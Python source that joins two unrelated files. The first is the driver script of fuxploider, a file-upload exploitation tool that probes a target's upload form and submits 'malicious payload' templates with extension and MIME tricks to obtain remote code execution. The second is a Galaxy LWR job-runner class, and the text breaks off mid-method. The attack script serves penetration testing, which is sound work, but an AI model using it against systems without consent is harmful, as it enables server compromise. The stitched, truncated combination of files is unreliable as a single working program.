templatesSection = "[TEMPLATES]\nTemplates are malicious payloads meant to be uploaded on the scanned remote server. Code execution detection is done based on the expected output of the payload."
templatesSection += "\n\tDefault templates are the following (name - description) : "
for t in templates :
	templatesSection+="\n\t  * '"+t["templateName"]+"' - "+t["description"]

parser = argparse.ArgumentParser(epilog=templatesSection,description=__doc__, formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument("-d", "--data", metavar="postData",dest="data", help="Additionnal data to be transmitted via POST method. Example : -d \"key1=value1&key2=value2\"", type=valid_postData)
parser.add_argument("--proxy", metavar="proxyUrl", dest="proxy", help="Proxy information. Example : --proxy \"user:password@proxy.host:8080\"", type=valid_proxyString)
parser.add_argument("--proxy-creds",metavar="credentials",nargs='?',const=True,dest="proxyCreds",help="Prompt for proxy credentials at runtime. Format : 'user:pass'",type=valid_proxyCreds)
parser.add_argument("-f","--filesize",metavar="integer",nargs=1,default=["10"],dest="size",help="File size to use for files to be created and uploaded (in kB).")
parser.add_argument("--cookies",metavar="omnomnom",nargs=1,dest="cookies",help="Cookies to use with HTTP requests. Example : PHPSESSID=aef45aef45afeaef45aef45&JSESSID=AQSEJHQSQSG",type=valid_postData)
parser.add_argument("--uploads-path",default=[None],metavar="path",nargs=1,dest="uploadsPath",help="Path on the remote server where uploads are put. Example : '/tmp/uploads/'")
parser.add_argument("-t","--template",metavar="templateName",nargs=1,dest="template",help="Malicious payload to use for code execution detection. Default is to use every known templates. For a complete list of templates, see the TEMPLATE section.")
parser.add_argument("-r","--regex-override",metavar="regex",nargs=1,dest="regexOverride",help="Specify a regular expression to detect code execution. Overrides the default code execution detection regex defined in the template in use.",type=valid_regex)
requiredNamedArgs = parser.add_argument_group('Required named arguments')
requiredNamedArgs.add_argument("-u","--url", metavar="target", dest="url",required=True, help="Web page URL containing the file upload form to be tested. Example : http://test.com/index.html?action=upload", type=valid_url)
requiredNamedArgs.add_argument("--not-regex", metavar="regex", help="Regex matching an upload failure", type=valid_regex,dest="notRegex")
requiredNamedArgs.add_argument("--true-regex",metavar="regex", help="Regex matching an upload success", type=valid_regex, dest="trueRegex")

exclusiveArgs = parser.add_mutually_exclusive_group()
exclusiveArgs.add_argument("-l","--legit-extensions",metavar="listOfExtensions",dest="legitExtensions",nargs=1,help="Legit extensions expected, for a normal use of the form, comma separated. Example : 'jpg,png,bmp'")
exclusiveArgs.add_argument("-n",metavar="n",nargs=1,default=["100"],dest="n",help="Number of common extensions to use. Example : -n 100", type=valid_nArg)

exclusiveVerbosityArgs = parser.add_mutually_exclusive_group()
exclusiveVerbosityArgs.add_argument("-v",action="store_true",required=False,dest="verbose",help="Verbose mode")
exclusiveVerbosityArgs.add_argument("-vv",action="store_true",required=False,dest="veryVerbose",help="Very verbose mode")
exclusiveVerbosityArgs.add_argument("-vvv",action="store_true",required=False,dest="veryVeryVerbose",help="Much verbose, very log, wow.")

parser.add_argument("-s","--skip-recon",action="store_true",required=False,dest="skipRecon",help="Skip recon phase, where fuxploider tries to determine what extensions are expected and filtered by the server. Needs -l switch.")
parser.add_argument("-y",action="store_true",required=False,dest="detectAllEntryPoints",help="Force detection of every entry points. Will not stop at first code exec found.")
parser.add_argument("-T","--threads",metavar="Threads",nargs=1,dest="nbThreads",help="Number of parallel tasks (threads).",type=int,default=[4])

exclusiveUserAgentsArgs = parser.add_mutually_exclusive_group()
exclusiveUserAgentsArgs.add_argument("-U","--user-agent",metavar="useragent",nargs=1,dest="userAgent",help="User-agent to use while requesting the target.",type=str,default=[requests.utils.default_user_agent()])
exclusiveUserAgentsArgs.add_argument("--random-user-agent",action="store_true",required=False,dest="randomUserAgent",help="Use a random user-agent while requesting the target.")

manualFormArgs = parser.add_argument_group('Manual Form Detection arguments')
manualFormArgs.add_argument("-m","--manual-form-detection",action="store_true",dest="manualFormDetection",help="Disable automatic form detection. Useful when automatic detection fails due to: (1) Form loaded using Javascript (2) Multiple file upload forms in URL.")
manualFormArgs.add_argument("--input-name",metavar="image",dest="inputName",help="Name of input for file. Example: <input type=\"file\" name=\"image\">")
manualFormArgs.add_argument("--form-action",default="",metavar="upload.php",dest="formAction",help="Path of form action. Example: <form method=\"POST\" action=\"upload.php\">")

args = parser.parse_args()
args.uploadsPath = args.uploadsPath[0]
args.nbThreads = args.nbThreads[0]
args.userAgent = args.userAgent[0]

if args.randomUserAgent :
	with open("user-agents.txt","r") as fd :
		nb = 0
		for l in fd :
			nb += 1
		fd.seek(0)
		nb = random.randint(0,nb)
		for i in range(0,nb) :
			args.userAgent = fd.readline()[:-1]

if args.template :
	args.template = args.template[0]
	if args.template not in templatesNames :
		logging.warning("Unknown template : %s",args.template)
		cont = input("Use default templates instead ? [Y/n]")
		if not cont.lower().startswith("y") :
			exit()
	else :
		templates = [[x for x in templates if x["templateName"] == args.template][0]]
if args.regexOverride :
	for t in templates :
		t["codeExecRegex"] = args.regexOverride[0]

args.verbosity = 0
if args.verbose :
	args.verbosity = 1
if args.veryVerbose :
	args.verbosity = 2
if args.veryVeryVerbose :
	args.verbosity = 3
logger.verbosity = args.verbosity
if args.verbosity > 0 :
	coloredlogs.install(logger=logger,fmt='%(asctime)s %(levelname)s - %(message)s',level=logging.DEBUG)


if args.proxyCreds and args.proxy == None :
	parser.error("--proxy-creds must be used with --proxy.")

if args.skipRecon and args.legitExtensions == None :
	parser.error("-s switch needs -l switch. Cannot skip recon phase without any known entry point.")

args.n = int(args.n[0])
args.size = int(args.size[0])
args.size = 1024*args.size

if not args.notRegex and not args.trueRegex :
	parser.error("At least one detection method must be provided, either with --not-regex or with --true-regex.")

if args.legitExtensions :
	args.legitExtensions = args.legitExtensions[0].split(",")

if args.cookies :
	args.cookies = postDataFromStringToJSON(args.cookies[0])

if args.manualFormDetection and args.inputName is None:
	parser.error("--manual-form-detection requires --input-name")

print("""\033[1;32m
                                     
 ___             _     _   _         
|  _|_ _ _ _ ___| |___|_|_| |___ ___ 
|  _| | |_'_| . | | . | | . | -_|  _|
|_| |___|_,_|  _|_|___|_|___|___|_|  
            |_|                      

\033[1m\033[42m{version """+version+"""}\033[m

\033[m[!] legal disclaimer : Usage of fuxploider for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
	""")
if args.proxyCreds == True :
	args.proxyCreds = {}
	args.proxyCreds["username"] = input("Proxy username : ")
	args.proxyCreds["password"] = getpass.getpass("Proxy password : ")

now = datetime.datetime.now()

print("[*] starting at "+str(now.hour)+":"+str(now.minute)+":"+str(now.second))

#mimeFile = "mimeTypes.advanced"
mimeFile = "mimeTypes.basic"
extensions = loadExtensions("file",mimeFile)
tmpLegitExt = []
if args.legitExtensions :
	args.legitExtensions = [x.lower() for x in args.legitExtensions]
	foundExt = [a[0] for a in extensions]
	for b in args.legitExtensions :
		if b in foundExt :
			tmpLegitExt.append(b)
		else :
			logging.warning("Extension %s can't be found as a valid/known extension with associated mime type.",b)
args.legitExtensions = tmpLegitExt

postData = postDataFromStringToJSON(args.data)

s = requests.Session()
if args.cookies :
	for key in args.cookies.keys() :
		s.cookies[key] = args.cookies[key]
s.headers = {'User-Agent':args.userAgent}
##### PROXY HANDLING #####
s.trust_env = False
if args.proxy :
	if args.proxy["username"] and args.proxy["password"] and args.proxyCreds :
		logging.warning("Proxy username and password provided by the --proxy-creds switch replaces credentials provided using the --proxy switch")
	if args.proxyCreds :
		proxyUser = args.proxyCreds["username"]
		proxyPass = args.proxyCreds["password"]
	else :
		proxyUser = args.proxy["username"]
		proxyPass = args.proxy["password"]
	proxyProtocol = args.proxy["protocol"]
	proxyHostname = args.proxy["hostname"]
	proxyPort = args.proxy["port"]
	proxy = ""
	if proxyProtocol != None :
		proxy += proxyProtocol+"://"
	else :
		proxy += "http://"

	if proxyUser != None and proxyPass != None :
		proxy += proxyUser+":"+proxyPass+"@"

	proxy += proxyHostname
	if proxyPort != None :
		proxy += ":"+proxyPort

	if proxyProtocol == "https" :
		proxies = {"https":proxy}
	else :
		proxies = {"http":proxy,"https":proxy}

	s.proxies.update(proxies)
#########################################################

if args.manualFormDetection:
	if args.formAction == "":
		logger.warning("Using Manual Form Detection and no action specified with --form-action. Defaulting to empty string - meaning form action will be set to --url parameter.")
	up = UploadForm(args.notRegex,args.trueRegex,s,args.size,postData,args.uploadsPath,args.url,args.formAction,args.inputName)
else:
	up = UploadForm(args.notRegex,args.trueRegex,s,args.size,postData,args.uploadsPath)
	up.setup(args.url)
up.threads = args.nbThreads
#########################################################

############################################################
uploadURL = up.uploadUrl
fileInput = {"name":up.inputName}

###### VALID EXTENSIONS DETECTION FOR THIS FORM ######

a = datetime.datetime.now()

if not args.skipRecon :
	if len(args.legitExtensions) > 0 :
		n = up.detectValidExtensions(extensions,args.n,args.legitExtensions)
	else :
		n = up.detectValidExtensions(extensions,args.n)
	logger.info("### Tried %s extensions, %s are valid.",n,len(up.validExtensions))
else :
	logger.info("### Skipping detection of valid extensions, using provided extensions instead (%s)",args.legitExtensions)
	up.validExtensions = args.legitExtensions

if up.validExtensions == [] :
	logger.error("No valid extension found.")
	exit()

b = datetime.datetime.now()
print("Extensions detection : "+str(b-a))


##############################################################################################################################################
##############################################################################################################################################
cont = input("Start uploading payloads ? [Y/n] : ")
up.shouldLog = True
if cont.lower().startswith("y") or cont == "" :
	pass
else :
	exit("Exiting.")

entryPoints = []
up.stopThreads = True

with open("techniques.json","r") as rawTechniques :
	techniques = json.loads(rawTechniques.read())
logger.info("### Starting code execution detection (messing with file extensions and mime types...)")
c = datetime.datetime.now()
nbOfEntryPointsFound = 0
attempts = []
templatesData = {}

for template in templates :
	templatefd = open(templatesFolder+"/"+template["filename"],"rb")
	templatesData[template["templateName"]] = templatefd.read()
	templatefd.close()
	nastyExt = template["nastyExt"]                    
	nastyMime = getMime(extensions,nastyExt)                    
	nastyExtVariants = template["extVariants"]                    
	for t in techniques :
		for nastyVariant in [nastyExt]+nastyExtVariants :
			for legitExt in up.validExtensions :
				legitMime = getMime(extensions,legitExt)                    
				mime = legitMime if t["mime"] == "legit" else nastyMime                    
				suffix = t["suffix"].replace("$legitExt$",legitExt).replace("$nastyExt$",nastyVariant)                    
				attempts.append({"suffix":suffix,"mime":mime,"templateName":template["templateName"]})                    


stopThreads = False

attemptsTested = 0

with concurrent.futures.ThreadPoolExecutor(max_workers=args.nbThreads) as executor :
	futures = []
	try :
		for a in attempts :
			suffix = a["suffix"]
			mime = a["mime"]
			payload = templatesData[a["templateName"]]
			codeExecRegex = [t["codeExecRegex"] for t in templates if t["templateName"] == a["templateName"]][0]

			f = executor.submit(up.submitTestCase,suffix,mime,payload,codeExecRegex)                    
			f.a = a
			futures.append(f)

		for future in concurrent.futures.as_completed(futures) :
			res = future.result()
			attemptsTested += 1
			if not stopThreads :
				if res["codeExec"] :

					foundEntryPoint = future.a
					logging.info("\033[1m\033[42mCode execution obtained ('%s','%s','%s')\033[m",foundEntryPoint["suffix"],foundEntryPoint["mime"],foundEntryPoint["templateName"])
					nbOfEntryPointsFound += 1
					entryPoints.append(foundEntryPoint)

					if not args.detectAllEntryPoints :
						raise KeyboardInterrupt

	except KeyboardInterrupt :
		stopThreads = True
		executor.shutdown(wait=False)
		executor._threads.clear()
		concurrent.futures.thread._threads_queues.clear()
		logger.setLevel(logging.CRITICAL)
		logger.verbosity = -1


################################################################################################################################################
################################################################################################################################################
d = datetime.datetime.now()
#print("Code exec detection : "+str(d-c))
print()
logging.info("%s entry point(s) found using %s HTTP requests.",nbOfEntryPointsFound,up.httpRequests)
print("Found the following entry points : ")
print(entryPoints)

import logging

from galaxy import model
from galaxy.jobs.runners import AsynchronousJobState, AsynchronousJobRunner
from galaxy.jobs import ComputeEnvironment
from galaxy.jobs import JobDestination
from galaxy.jobs.command_factory import build_command
from galaxy.tools.deps import dependencies
from galaxy.util import string_as_bool_or_none
from galaxy.util.bunch import Bunch

import errno
from time import sleep
import os

from .lwr_client import build_client_manager
from .lwr_client import url_to_destination_params
from .lwr_client import finish_job as lwr_finish_job
from .lwr_client import submit_job as lwr_submit_job
from .lwr_client import ClientJobDescription
from .lwr_client import LwrOutputs
from .lwr_client import ClientOutputs
from .lwr_client import PathMapper

log = logging.getLogger( __name__ )

__all__ = [ 'LwrJobRunner' ]

NO_REMOTE_GALAXY_FOR_METADATA_MESSAGE = "LWR misconfiguration - LWR client configured to set metadata remotely, but remote LWR isn't properly configured with a galaxy_home directory."
NO_REMOTE_DATATYPES_CONFIG = "LWR client is configured to use remote datatypes configuration when setting metadata externally, but LWR is not configured with this information. Defaulting to datatypes_conf.xml."

# Is there a good way to infer some default for this? Can only use
# url_for from web threads. https://gist.github.com/jmchilton/9098762
DEFAULT_GALAXY_URL = "http://localhost:8080"


class LwrJobRunner( AsynchronousJobRunner ):
    """
    LWR Job Runner
    """
    runner_name = "LWRRunner"

    def __init__( self, app, nworkers, transport=None, cache=None, url=None, galaxy_url=DEFAULT_GALAXY_URL ):
        """Start the job runner """
        super( LwrJobRunner, self ).__init__( app, nworkers )
        self.async_status_updates = dict()
        self._init_monitor_thread()
        self._init_worker_threads()
        client_manager_kwargs = {'transport_type': transport, 'cache': string_as_bool_or_none(cache), "url": url}
        self.galaxy_url = galaxy_url
        self.client_manager = build_client_manager(**client_manager_kwargs)

    def url_to_destination( self, url ):
        """Convert a legacy URL to a job destination"""
        return JobDestination( runner="lwr", params=url_to_destination_params( url ) )

    def check_watched_item(self, job_state):
        try:
            client = self.get_client_from_state(job_state)

            if hasattr(self.client_manager, 'ensure_has_status_update_callback'):
                # Message queue implementation.

                # TODO: Very hacky now, refactor after Dannon merges in his
                # message queue work, runners need the ability to disable
                # check_watched_item like this and instead a callback needs to
                # be issued post job recovery allowing a message queue
                # consumer to be setup.
                self.client_manager.ensure_has_status_update_callback(self.__async_update)
                return job_state

            status = client.get_status()
        except Exception:
            # An orphaned job was put into the queue at app startup, so remote server went down
            # either way we are done I guess.
            self.mark_as_finished(job_state)
            return None
        job_state = self.__update_job_state_for_lwr_status(job_state, status)
        return job_state

    def __update_job_state_for_lwr_status(self, job_state, lwr_status):
        if lwr_status == "complete":
            self.mark_as_finished(job_state)
            return None
        if lwr_status == "running" and not job_state.running:
            job_state.running = True
            job_state.job_wrapper.change_state( model.Job.states.RUNNING )
        return job_state

    def __async_update( self, full_status ):
        job_id = full_status[ "job_id" ]
        job_state = self.__find_watched_job( job_id )
        if not job_state:
            # Probably finished too quickly, sleep and try again.
            # Kind of a hack, why does monitor queue need to no wait
            # get and sleep instead of doing a busy wait that would
            # respond immediately.
            sleep( 2 )
            job_state = self.__find_watched_job( job_id )
        if not job_state:
            log.warn( "Failed to find job corresponding to final status %s in %s" % ( full_status, self.watched ) )
        else:                    
            self.__update_job_state_for_lwr_status(job_state, full_status["status"])

    def __find_watched_job( self, job_id ):
        found_job = None
        for async_job_state in self.watched:
            if str( async_job_state.job_id ) == job_id:
                found_job = async_job_state
                break
        return found_job

    def queue_job(self, job_wrapper):
        job_destination = job_wrapper.job_destination

        command_line, client, remote_job_config, compute_environment = self.__prepare_job( job_wrapper, job_destination )

        if not command_line:
            return

        try:
            dependencies_description = LwrJobRunner.__dependencies_description( client, job_wrapper )
            rewrite_paths = not LwrJobRunner.__rewrite_parameters( client )
            unstructured_path_rewrites = {}
            if compute_environment:
                unstructured_path_rewrites = compute_environment.unstructured_path_rewrites

            client_job_description = ClientJobDescription(
                command_line=command_line,
                input_files=self.get_input_files(job_wrapper),
                client_outputs=self.__client_outputs(client, job_wrapper),
                working_directory=job_wrapper.working_directory,
                tool=job_wrapper.tool,
                config_files=job_wrapper.extra_filenames,
                dependencies_description=dependencies_description,
                env=client.env,
                rewrite_paths=rewrite_paths,
                arbitrary_files=unstructured_path_rewrites,
            )
            job_id = lwr_submit_job(client, client_job_description, remote_job_config)
            log.info("lwr job submitted with job_id %s" % job_id)
            job_wrapper.set_job_destination( job_destination, job_id )
            job_wrapper.change_state( model.Job.states.QUEUED )
        except Exception:
            job_wrapper.fail( "failure running job", exception=True )
            log.exception("failure running job %d" % job_wrapper.job_id)
            return

        lwr_job_state = AsynchronousJobState()
        lwr_job_state.job_wrapper = job_wrapper
        lwr_job_state.job_id = job_id
        lwr_job_state.old_state = True
        lwr_job_state.running = False
        lwr_job_state.job_destination = job_destination
        self.monitor_job(lwr_job_state)

    def __prepare_job(self, job_wrapper, job_destination):
        """ Build command-line and LWR client for this job. """
        command_line = None
        client = None
        remote_job_config = None
        compute_environment = None
        try:
            client = self.get_client_from_wrapper(job_wrapper)
            tool = job_wrapper.tool
            remote_job_config = client.setup(tool.id, tool.version)
            rewrite_parameters = LwrJobRunner.__rewrite_parameters( client )
            prepare_kwds = {}
            if rewrite_parameters:
                compute_environment = LwrComputeEnvironment( client, job_wrapper, remote_job_config )
                prepare_kwds[ 'compute_environment' ] = compute_environment
            job_wrapper.prepare( **prepare_kwds )
            self.__prepare_input_files_locally(job_wrapper)
            remote_metadata = LwrJobRunner.__remote_metadata( client )
            remote_work_dir_copy = LwrJobRunner.__remote_work_dir_copy( client )
            dependency_resolution = LwrJobRunner.__dependency_resolution( client )
            metadata_kwds = self.__build_metadata_configuration(client, job_wrapper, remote_metadata, remote_job_config)
            remote_command_params = dict(
                working_directory=remote_job_config['working_directory'],
                metadata_kwds=metadata_kwds,
                dependency_resolution=dependency_resolution,
            )
            command_line = build_command(
                self,
                job_wrapper=job_wrapper,
                include_metadata=remote_metadata,
                include_work_dir_outputs=remote_work_dir_copy,                    
                remote_command_params=remote_command_params,
            )
        except Exception:
            job_wrapper.fail( "failure preparing job", exception=True )
            log.exception("failure running job %d" % job_wrapper.job_id)

        # If we were able to get a command line, run the job
        if not command_line:
            job_wrapper.finish( '', '' )

        return command_line, client, remote_job_config, compute_environment

    def __prepare_input_files_locally(self, job_wrapper):
        """Run task splitting commands locally."""
        prepare_input_files_cmds = getattr(job_wrapper, 'prepare_input_files_cmds', None)
        if prepare_input_files_cmds is not None:
            for cmd in prepare_input_files_cmds:  # run the commands to stage the input files
                if 0 != os.system(cmd):
                    raise Exception('Error running file staging command: %s' % cmd)
            job_wrapper.prepare_input_files_cmds = None  # prevent them from being used in-line

    def get_output_files(self, job_wrapper):
        output_paths = job_wrapper.get_output_fnames()
        return [ str( o ) for o in output_paths ]   # Force job_path from DatasetPath objects.

    def get_input_files(self, job_wrapper):
        input_paths = job_wrapper.get_input_paths()
        return [ str( i ) for i in input_paths ]  # Force job_path from DatasetPath objects.

    def get_client_from_wrapper(self, job_wrapper):
        job_id = job_wrapper.job_id
        if hasattr(job_wrapper, 'task_id'):
            job_id = "%s_%s" % (job_id, job_wrapper.task_id)
        params = job_wrapper.job_destination.params.copy()
        for key, value in params.iteritems():
            if value:
                params[key] = model.User.expand_user_properties( job_wrapper.get_job().user, value )
        env = getattr( job_wrapper.job_destination, "env", [] )
        return self.get_client( params, job_id, env )

    def get_client_from_state(self, job_state):
        job_destination_params = job_state.job_destination.params
        job_id = job_state.job_id
        return self.get_client( job_destination_params, job_id )

    def get_client( self, job_destination_params, job_id, env=[] ):
        # Cannot use url_for outside of web thread.
        #files_endpoint = url_for( controller="job_files", job_id=encoded_job_id )

        encoded_job_id = self.app.security.encode_id(job_id)
        job_key = self.app.security.encode_id( job_id, kind="jobs_files" )
        files_endpoint = "%s/api/jobs/%s/files?job_key=%s" % (
            self.galaxy_url,
            encoded_job_id,
            job_key
        )
        get_client_kwds = dict(
            job_id=str( job_id ),
            files_endpoint=files_endpoint,
            env=env
        )
        return self.client_manager.get_client( job_destination_params, **get_client_kwds )

    def finish_job( self, job_state ):
        stderr = stdout = ''
        job_wrapper = job_state.job_wrapper
        try:
            client = self.get_client_from_state(job_state)
            run_results = client.full_status()

            stdout = run_results.get('stdout', '')
            stderr = run_results.get('stderr', '')
            exit_code = run_results.get('returncode', None)
            lwr_outputs = LwrOutputs.from_status_response(run_results)
            # Use LWR client code to transfer/copy files back
            # and cleanup job if needed.
            completed_normally = \
                job_wrapper.get_state() not in [ model.Job.states.ERROR, model.Job.states.DELETED ]
            cleanup_job = self.app.config.cleanup_job
            client_outputs = self.__client_outputs(client, job_wrapper)
            finish_args = dict( client=client,
                                job_completed_normally=completed_normally,
                                cleanup_job=cleanup_job,
                                client_outputs=client_outputs,
                                lwr_outputs=lwr_outputs )
            failed = lwr_finish_job( **finish_args )

            if failed:
                job_wrapper.fail("Failed to find or download one or more job outputs from remote server.", exception=True)
        except Exception:
            message = "Failed to communicate with remote job server."
            job_wrapper.fail( message, exception=True )
            log.exception("failure finishing job %d" % job_wrapper.job_id)
            return
        if not LwrJobRunner.__remote_metadata( client ):
            self._handle_metadata_externally( job_wrapper, resolve_requirements=True )
        # Finish the job
        try:
            job_wrapper.finish( stdout, stderr, exit_code )
        except Exception:
            log.exception("Job wrapper finish method failed")
            job_wrapper.fail("Unable to finish job", exception=True)

    def fail_job( self, job_state ):
        """
        Seperated out so we can use the worker threads for it.
        """
        self.stop_job( self.sa_session.query( self.app.model.Job ).get( job_state.job_wrapper.job_id ) )
        job_state.job_wrapper.fail( job_state.fail_message )

    def check_pid( self, pid ):
        try:
            os.kill( pid, 0 )
            return True
        except OSError, e:
            if e.errno == errno.ESRCH:
                log.debug( "check_pid(): PID %d is dead" % pid )
            else:                    
                log.warning( "check_pid(): Got errno %s when attempting to check PID %d: %s" % ( errno.errorcode[e.errno], pid, e.strerror ) )
            return False

    def stop_job( self, job ):
        #if our local job has JobExternalOutputMetadata associated, then our primary job has to have already finished
        job_ext_output_metadata = job.get_external_output_metadata()
        if job_ext_output_metadata:
            pid = job_ext_output_metadata[0].job_runner_external_pid  # every JobExternalOutputMetadata has a pid set, we just need to take from one of them
            if pid in [ None, '' ]:
                log.warning( "stop_job(): %s: no PID in database for job, unable to stop" % job.id )
                return
            pid = int( pid )
            if not self.check_pid( pid ):
                log.warning( "stop_job(): %s: PID %d was already dead or can't be signaled" % ( job.id, pid ) )
                return
            for sig in [ 15, 9 ]:
                try:
                    os.killpg( pid, sig )
                except OSError, e:
                    log.warning( "stop_job(): %s: Got errno %s when attempting to signal %d to PID %d: %s" % ( job.id, errno.errorcode[e.errno], sig, pid, e.strerror ) )
                    return  # give up
                sleep( 2 )
                if not self.check_pid( pid ):
                    log.debug( "stop_job(): %s: PID %d successfully killed with signal %d" % ( job.id, pid, sig ) )
                    return
                else:                    
                    log.warning( "stop_job(): %s: PID %d refuses to die after signaling TERM/KILL" % ( job.id, pid ) )
        else:                    
            # Remote kill
            lwr_url = job.job_runner_name
            job_id = job.job_runner_external_id
            log.debug("Attempt remote lwr kill of job with url %s and id %s" % (lwr_url, job_id))
            client = self.get_client(job.destination_params, job_id)
            client.kill()

    def recover( self, job, job_wrapper ):
        """Recovers jobs stuck in the queued/running state when Galaxy started"""
        job_state = AsynchronousJobState()
        job_state.job_id = str( job.get_job_runner_external_id() )
        job_state.runner_url = job_wrapper.get_job_runner_url()
        job_state.job_destination = job_wrapper.job_destination
        job_wrapper.command_line = job.get_command_line()
        job_state.job_wrapper = job_wrapper
        state = job.get_state()
        if state in [model.Job.states.RUNNING, model.Job.states.QUEUED]:
            log.debug( "(LWR/%s) is still in running state, adding to the LWR queue" % ( job.get_id()) )
            job_state.old_state = True
            job_state.running = state == model.Job.states.RUNNING
            self.monitor_queue.put( job_state )

    def shutdown( self ):
        super( LwrJobRunner, self ).shutdown()
        self.client_manager.shutdown()

    def __client_outputs( self, client, job_wrapper ):
        remote_work_dir_copy = LwrJobRunner.__remote_work_dir_copy( client )
        if not remote_work_dir_copy:                    
            work_dir_outputs = self.get_work_dir_outputs( job_wrapper )
        else:                    
            # They have already been copied over to look like regular outputs remotely,
            # no need to handle them differently here.
            work_dir_outputs = []                    
        output_files = self.get_output_files( job_wrapper )
        client_outputs = ClientOutputs(
            working_directory=job_wrapper.working_directory,
            work_dir_outputs=work_dir_outputs,
            output_files=output_files,
            version_file=job_wrapper.get_version_string_path(),
        )
        return client_outputs

    @staticmethod                    
    def __dependencies_description( lwr_client, job_wrapper ):
        dependency_resolution = LwrJobRunner.__dependency_resolution( lwr_client )
        remote_dependency_resolution = dependency_resolution == "remote"
        if not remote_dependency_resolution:
            return None
        requirements = job_wrapper.tool.requirements or []
        installed_tool_dependencies = job_wrapper.tool.installed_tool_dependencies or []
        return dependencies.DependenciesDescription(
            requirements=requirements,
            installed_tool_dependencies=installed_tool_dependencies,
        )

    @staticmethod                    
    def __dependency_resolution( lwr_client ):
        dependency_resolution = lwr_client.destination_params.get( "dependency_resolution", "local" )
        if dependency_resolution not in ["none", "local", "remote"]:
            raise Exception("Unknown dependency_resolution value encountered %s" % dependency_resolution)
        return dependency_resolution

    @staticmethod                    
    def __remote_metadata( lwr_client ):
        remote_metadata = string_as_bool_or_none( lwr_client.destination_params.get( "remote_metadata", False ) )
        return remote_metadata

    @staticmethod                    
    def __remote_work_dir_copy( lwr_client ):
        # Right now remote metadata handling assumes from_work_dir outputs
        # have been copied over before it runs. So do that remotely. This is
        # not the default though because adding it to the command line is not
        # cross-platform (no cp on Windows) and it's un-needed work outside
        # the context of metadata settting (just as easy to download from
        # either place.)
        return LwrJobRunner.__remote_metadata( lwr_client )

    @staticmethod                    
    def __use_remote_datatypes_conf( lwr_client ):
        """ When setting remote metadata, use integrated datatypes from this
        Galaxy instance or use the datatypes config configured via the remote
        LWR.

        Both options are broken in different ways for same reason - datatypes
        may not match. One can push the local datatypes config to the remote
        server - but there is no guarentee these datatypes will be defined
        there. Alternatively, one can use the remote datatype config - but
        there is no guarentee that it will contain all the datatypes available
        to this Galaxy.
        """
        use_remote_datatypes = string_as_bool_or_none( lwr_client.destination_params.get( "use_remote_datatypes", False ) )
        return use_remote_datatypes

    @staticmethod                    
    def __rewrite_parameters( lwr_client ):
        return string_as_bool_or_none( lwr_client.destination_params.get( "rewrite_parameters", False ) ) or False

    def __build_metadata_configuration(self, client, job_wrapper, remote_metadata, remote_job_config):
        metadata_kwds = {}
        if remote_metadata:
            remote_system_properties = remote_job_config.get("system_properties", {})
            remote_galaxy_home = remote_system_properties.get("galaxy_home", None)
            if not remote_galaxy_home:
                raise Exception(NO_REMOTE_GALAXY_FOR_METADATA_MESSAGE)
            metadata_kwds['exec_dir'] = remote_galaxy_home
            outputs_directory = remote_job_config['outputs_directory']
            configs_directory = remote_job_config['configs_directory']
            working_directory = remote_job_config['working_directory']
            outputs = [Bunch(false_path=os.path.join(outputs_directory, os.path.basename(path)), real_path=path) for path in self.get_output_files(job_wrapper)]
            metadata_kwds['output_fnames'] = outputs
            metadata_kwds['compute_tmp_dir'] = working_directory
            metadata_kwds['config_root'] = remote_galaxy_home
            default_config_file = os.path.join(remote_galaxy_home, 'universe_wsgi.ini')
            metadata_kwds['config_file'] = remote_system_properties.get('galaxy_config_file', default_config_file)
            metadata_kwds['dataset_files_path'] = remote_system_properties.get('galaxy_dataset_files_path', None)
            if LwrJobRunner.__use_remote_datatypes_conf( client ):
                remote_datatypes_config = remote_system_properties.get('galaxy_datatypes_config_file', None)
                if not remote_datatypes_config:
                    log.warn(NO_REMOTE_DATATYPES_CONFIG)
                    remote_datatypes_config = os.path.join(remote_galaxy_home, 'datatypes_conf.xml')
                metadata_kwds['datatypes_config'] = remote_datatypes_config
            else:                    
                integrates_datatypes_config = self.app.datatypes_registry.integrated_datatypes_configs
                # Ensure this file gets pushed out to the remote config dir.
                job_wrapper.extra_filenames.append(integrates_datatypes_config)

                metadata_kwds['datatypes_config'] = os.path.join(configs_directory, os.path.basename(integrates_datatypes_config))
        return metadata_kwds


class LwrComputeEnvironment( ComputeEnvironment ):

    def __init__( self, lwr_client, job_wrapper, remote_job_config ):
        self.lwr_client = lwr_client
        self.job_wrapper = job_wrapper
        self.local_path_config = job_wrapper.default_compute_environment()
        self.unstructured_path_rewrites = {}
        # job_wrapper.prepare is going to expunge the job backing the following
        # computations, so precalculate these paths.
        self._wrapper_input_paths = self.local_path_config.input_paths()
        self._wrapper_output_paths = self.local_path_config.output_paths()
        self.path_mapper = PathMapper(lwr_client, remote_job_config, self.local_path_config.working_directory())
        self._config_directory = remote_job_config[ "configs_directory" ]
        self._working_directory = remote_job_config[ "working_directory" ]
        self._sep = remote_job_config[ "system_properties" ][ "separator" ]
        self._tool_dir = remote_job_config[ "tools_directory" ]
        version_path = self.local_path_config.version_path()
        new_version_path = self.path_mapper.remote_version_path_rewrite(version_path)
        if new_version_path:
            version_path = new_version_path
        self._version_path = version_path

    def output_paths( self ):
        local_output_paths = self._wrapper_output_paths

        results = []
        for local_output_path in local_output_paths:
            wrapper_path = str( local_output_path )
            remote_path = self.path_mapper.remote_output_path_rewrite( wrapper_path )
            results.append( self._dataset_path( local_output_path, remote_path ) )
        return results

    def input_paths( self ):
        local_input_paths = self._wrapper_input_paths

        results = []
        for local_input_path in local_input_paths:
            wrapper_path = str( local_input_path )
            # This will over-copy in some cases. For instance in the case of task
            # splitting, this input will be copied even though only the work dir
            # input will actually be used.
            remote_path = self.path_mapper.remote_input_path_rewrite( wrapper_path )
            results.append( self._dataset_path( local_input_path, remote_path ) )
        return results

    def _dataset_path( self, local_dataset_path, remote_path ):
        remote_extra_files_path = None
        if remote_path:
            remote_extra_files_path = "%s_files" % remote_path[ 0:-len( ".dat" ) ]
        return local_dataset_path.with_path_for_job( remote_path, remote_extra_files_path )

    def working_directory( self ):
        return self._working_directory

    def config_directory( self ):
        return self._config_directory

    def new_file_path( self ):
        return self.working_directory()  # Problems with doing this?

    def sep( self ):
        return self._sep

    def version_path( self ):
        return self._version_path

    def rewriter( self, parameter_value ):
        unstructured_path_rewrites = self.unstructured_path_rewrites
        if parameter_value in unstructured_path_rewrites:
            # Path previously mapped, use previous mapping.
